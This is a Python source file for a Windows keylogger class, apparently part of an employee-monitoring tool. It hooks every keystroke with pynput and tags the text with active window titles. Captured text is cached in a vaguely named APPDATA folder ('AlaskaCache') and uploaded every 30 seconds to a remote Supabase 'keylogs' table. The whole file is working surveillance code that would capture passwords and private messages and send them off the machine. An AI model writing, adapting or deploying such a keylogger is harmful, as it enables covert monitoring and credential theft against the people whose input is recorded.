import time
import asyncio
import ctypes
import os
from pynput import keyboard
from supabase import Client

class KeyloggerService:
    def __init__(self, supabase: Client, employee_id: str):
        self.supabase = supabase
        self.employee_id = employee_id
        self.buffer = []
        self.last_flush = time.time()
        self.flush_interval = 30
        self.current_window = None
        self.cache_file = os.path.join(os.getenv('APPDATA'), 'AlaskaCache', 'keylogs_cache.txt')
        
        # Ensure cache dir exists
        os.makedirs(os.path.dirname(self.cache_file), exist_ok=True)

    def get_active_window_title(self):
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value or "Unknown Window"
        except:
            return "Unknown"

    def on_press(self, key):
        active_window = self.get_active_window_title()
        if active_window != self.current_window:
            self.current_window = active_window
            timestamp = time.strftime("%H:%M:%S")
            self.buffer.append(f"\n[{timestamp} | APP: {active_window}]\n")

        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = ' '
            elif key == keyboard.Key.enter:
                char = '\n'
            elif key == keyboard.Key.backspace:
                char = '[BS]'
            else:
                char = f'[{key.name}]'
        
        self.buffer.append(char)

    async def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        print("Keylogger started.")
        
        # Try to sync old cache on startup
        await self.sync_cache()

        while True:
            await asyncio.sleep(1)
            if time.time() - self.last_flush > self.flush_interval:
                await self.flush()

    async def flush(self):
        if not self.buffer:
            self.last_flush = time.time()
            return

        text_block = "".join(self.buffer)
        self.buffer = []
        self.last_flush = time.time()

        if await self.try_upload(text_block):
            print("Keylogs flushed.")
            # Also try to sync cache if we are online
            await self.sync_cache()
        else:
            print("Offline. Saving keylogs to cache.")
            self.save_to_cache(text_block)

    async def try_upload(self, text):
        try:
            self.supabase.table("keylogs").insert({
                "employee_id": self.employee_id,
                "content": text
            }).execute()
            return True
        except Exception as e:
            # print(f"Upload failed: {e}") 
            return False

    def save_to_cache(self, text):
        try:
            with open(self.cache_file, "a", encoding="utf-8") as f:
                f.write(text)
        except Exception as e:
            print(f"Error saving to cache: {e}")

    async def sync_cache(self):
        if not os.path.exists(self.cache_file):
            return

        try:
            with open(self.cache_file, "r", encoding="utf-8") as f:
                content = f.read()
            
            if not content:
                return

            if await self.try_upload(content):
                print("Keylog cache synced.")
                # Clear file
                with open(self.cache_file, "w", encoding="utf-8") as f:
                    f.write("")
        except Exception as e:
            print(f"Error syncing cache: {e}")
